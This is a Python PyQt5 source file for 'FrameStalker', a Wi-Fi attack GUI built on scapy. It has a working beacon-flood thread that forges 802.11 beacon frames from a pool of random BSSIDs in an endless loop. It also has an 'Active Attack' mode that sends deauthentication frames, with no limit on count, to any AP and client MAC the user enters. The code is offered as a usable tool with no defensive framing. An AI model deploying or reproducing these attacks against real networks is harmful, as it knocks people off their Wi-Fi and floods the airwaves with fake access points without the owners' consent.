import sys
import random
import time
import re

from PyQt5.QtWidgets import (
    QApplication, QWidget, QVBoxLayout, QPushButton, QTextBrowser,
    QComboBox, QLabel, QHBoxLayout, QGroupBox, QMessageBox, QInputDialog, QFileDialog
)
from PyQt5.QtCore import QThread, pyqtSignal, pyqtSlot
from PyQt5.QtGui import QColor, QPalette

from scapy.all import get_if_list, RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp

from sniffers.beacon_sniffer import sniff_beacons
from sniffers.deauth_sniffer import sniff_deauth, send_deauth
from sniffers.sta_sniffer import sniff_stas
from sniffers.beacon_flooder import send_fake_beacons, get_most_used_channel, generate_random_mac, set_channel
from ui.logger import log_bridge, log

def is_valid_mac(mac: str) -> bool:
    return re.fullmatch(r'([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}', mac) is not None or mac.lower() == 'ff:ff:ff:ff:ff:ff'

class SnifferThread(QThread):
    def __init__(self, sniffer_function, interface):
        super().__init__()
        self.sniffer_function = sniffer_function
        self.interface = interface

    def run(self):
        self.sniffer_function(self.interface, log_callback=log)


class DeauthThread(QThread):
    def __init__(self, interface, bssid, target, channel, count):
        super().__init__()
        self.interface = interface
        self.bssid = bssid
        self.target = target
        self.channel = channel
        self.count = count

    def run(self):
        try:
            send_deauth(
                self.interface,
                self.bssid,
                self.target,
                self.channel,
                self.count,
                log_callback=log
            )
        except Exception as e:
            log(f"[!] Error during deauth: {e}")


class BeaconFloodThread(QThread):
    def __init__(self, interface, ssid_list, channel=None, pool_size=10):
        super().__init__()
        self.interface = interface
        self.base_ssid = ssid_list[0] if ssid_list else "hacked"
        self.channel = channel
        self._running = True
        self.bssid_pool = [generate_random_mac() for _ in range(pool_size)]
        self.index = 0
        self.pool_size = pool_size

    def run(self):
        while self._running:
            current_bssid = self.bssid_pool[self.index]
            current_suffix = self.index + 1
            current_ssid = f"{self.base_ssid}_{current_suffix}"

            if self.channel is not None:
                set_channel(self.interface, self.channel)

            dot11 = Dot11(
                type=0, subtype=8,
                addr1="ff:ff:ff:ff:ff:ff",
                addr2=current_bssid,
                addr3=current_bssid
            )
            beacon = Dot11Beacon(cap="ESS+privacy")
            essid = Dot11Elt(ID="SSID", info=current_ssid.encode())
            rates = Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x24\x30\x48\x6c")
            ch = self.channel if self.channel else 11
            dsset = Dot11Elt(ID="DSset", info=bytes([ch]))

            packet = RadioTap() / dot11 / beacon / essid / rates / dsset
            sendp(packet, iface=self.interface, count=3, inter=0.02, verbose=0)

            log(f"[i] Beacon sent on channel {ch} as '{current_ssid}' ({current_bssid})")

            self.index = (self.index + 1) % self.pool_size
            time.sleep(0.05)

    def stop(self):
        self._running = False


class FrameStalkerGUI(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("FrameStalker")
        self.setMinimumSize(800, 600)

        self.active_thread = None
        self.packet_count = 0
        self.deauth_count = 0
        self.sta_count = 0

        self.init_ui()
        self.apply_dark_mode()
        log_bridge.signal.connect(self.append_log)

    def init_ui(self):
        layout = QVBoxLayout()

        interface_layout = QHBoxLayout()
        interface_label = QLabel("Select Interface:")
        self.interface_dropdown = QComboBox()
        self.interface_dropdown.addItems(get_if_list())
        interface_layout.addWidget(interface_label)
        interface_layout.addWidget(self.interface_dropdown)
        layout.addLayout(interface_layout)

        button_group = QGroupBox("Sniffers & Tools")
        button_layout = QHBoxLayout()

        self.beacon_btn = QPushButton("Start Beacon Sniffer")
        self.beacon_btn.clicked.connect(self.start_beacon)

        self.deauth_btn = QPushButton("Deauth Options")
        self.deauth_btn.clicked.connect(self.choose_deauth_mode)

        self.sta_btn = QPushButton("Start STA Sniffer")
        self.sta_btn.clicked.connect(self.start_sta)

        self.flood_btn = QPushButton("Start Beacon Flood")
        self.flood_btn.clicked.connect(self.start_flood)

        button_layout.addWidget(self.beacon_btn)
        button_layout.addWidget(self.deauth_btn)
        button_layout.addWidget(self.sta_btn)
        button_layout.addWidget(self.flood_btn)
        button_group.setLayout(button_layout)
        layout.addWidget(button_group)

        self.log_box = QTextBrowser()
        self.log_box.setReadOnly(True)
        layout.addWidget(self.log_box)

        bottom_button_layout = QHBoxLayout()
        self.stop_btn = QPushButton("Stop")
        self.stop_btn.clicked.connect(self.stop_sniffer)
        self.save_log_btn = QPushButton("Save Log")
        self.save_log_btn.clicked.connect(self.save_log)
        bottom_button_layout.addWidget(self.stop_btn)
        bottom_button_layout.addWidget(self.save_log_btn)
        layout.addLayout(bottom_button_layout)

        self.status_label = QLabel("[i] Ready.")
        layout.addWidget(self.status_label)
        self.setLayout(layout)

    def apply_dark_mode(self):
        palette = QPalette()
        palette.setColor(QPalette.Window, QColor(30, 30, 30))
        palette.setColor(QPalette.WindowText, QColor(180, 255, 180))
        palette.setColor(QPalette.Base, QColor(20, 20, 20))
        palette.setColor(QPalette.Text, QColor(180, 255, 180))
        palette.setColor(QPalette.Button, QColor(50, 50, 50))
        palette.setColor(QPalette.ButtonText, QColor(0, 255, 0))
        self.setPalette(palette)

    @pyqtSlot(str)
    def append_log(self, message):
        self.log_box.append(message)
        self.packet_count += 1
        if "Deauth" in message:
            self.deauth_count += 1
        if "STA Detected" in message:
            self.sta_count += 1
        self.update_status()

    def update_status(self):
        self.status_label.setText(
            f"[i] Packets: {self.packet_count} | Deauths: {self.deauth_count} | STAs: {self.sta_count}"
        )

    def save_log(self):
        filename, _ = QFileDialog.getSaveFileName(self, "Save Log", "frame_stalker_log.txt", "Text Files (*.txt)")
        if filename:
            with open(filename, "w") as f:
                f.write(self.log_box.toPlainText())
            log(f"[+] Log saved to {filename}")

    def stop_sniffer(self):
        if self.active_thread and self.active_thread.isRunning():
            if hasattr(self.active_thread, 'stop'):
                self.active_thread.stop()
            self.active_thread.terminate()
            self.active_thread.wait()
            log("[!] Thread terminated.")
            self.active_thread = None

    def start_sniffer(self, sniffer_func):
        if self.active_thread and self.active_thread.isRunning():
            QMessageBox.warning(self, "Already Running", "A thread is already running. Use Stop to end it.")
            return

        iface = self.interface_dropdown.currentText()
        self.active_thread = SnifferThread(sniffer_func, iface)
        self.active_thread.start()
        log("[i] Sniffer started...")

    def start_beacon(self):
        self.start_sniffer(sniff_beacons)

    def start_deauth_passive(self):
        self.start_sniffer(sniff_deauth)


    def start_deauth_active(self):
        iface = self.interface_dropdown.currentText()

        while True:
            bssid, ok1 = QInputDialog.getText(self, "Active Deauth", "Enter AP BSSID:")
            if not ok1:
                return
            if is_valid_mac(bssid):
                break
            QMessageBox.critical(self, "Invalid MAC", f"The AP BSSID '{bssid}' is not valid.")

        while True:
            target, ok2 = QInputDialog.getText(self, "Active Deauth", "Enter target MAC:")
            if not ok2:
                return
            if is_valid_mac(target):
                break
            QMessageBox.critical(self, "Invalid MAC", f"The target MAC '{target}' is not valid.")

        channel, ok3 = QInputDialog.getInt(self, "Channel", "Enter AP Channel:", min=1, max=165)
        if not ok3:
            return

        count, ok4 = QInputDialog.getInt(self, "Count", "Number of deauth frames (0 = infinite):", value=0, min=0)
        if not ok4:
            return

        self.active_thread = DeauthThread(iface, bssid, target, channel, count)
        self.active_thread.start()

            

    def choose_deauth_mode(self):
        choice, ok = QInputDialog.getItem(self, "Deauth Mode", "Choose:", ["Passive Sniffer", "Active Attack"], 0, False)
        if ok:
            if choice == "Passive Sniffer":
                self.start_deauth_passive()
            elif choice == "Active Attack":
                self.start_deauth_active()

    def start_sta(self):
        self.start_sniffer(sniff_stas)

    def start_flood(self):
        if self.active_thread and self.active_thread.isRunning():
            QMessageBox.warning(self, "Already Running", "Stop the current thread first.")
            return

        iface = self.interface_dropdown.currentText()
        ssid_input, ok = QInputDialog.getText(self, "Beacon Flood", "Enter SSID:")
        if not (ok and ssid_input):
            return
        ssid_list = [s.strip() for s in ssid_input.split(",") if s.strip()]

        mode_options = ["Auto (Most Used Channel)", "Manual Selection"]
        mode, ok = QInputDialog.getItem(self, "Channel Mode", "Select channel mode:", mode_options, 0, False)
        if not ok:
            return

        if mode == "Auto (Most Used Channel)":
            ch, _ = get_most_used_channel(iface, duration=5)
            if ch is None:
                ch = 6
        else:
            ch, ok = QInputDialog.getInt(self, "Channel Selection", "Enter channel number:", min=1, max=165, value=6)
            if not ok:
                return

        pool_size, ok = QInputDialog.getInt(self, "BSSID Pool Size", "Enter number of BSSIDs to use:", min=1, max=50, value=10)
        if not ok:
            pool_size = 10

        self.active_thread = BeaconFloodThread(iface, ssid_list, channel=ch, pool_size=pool_size)
        self.active_thread.start()
        log(f"[i] Beacon flood started on channel {ch} with SSIDs: {', '.join(ssid_list)} using a pool of {pool_size} BSSIDs.")


def main():
    app = QApplication(sys.argv)
    window = FrameStalkerGUI()
    window.show()
    sys.exit(app.exec_())


if __name__ == "__main__":
    main()


#sudo python3 -m ui.frame_stalker_gui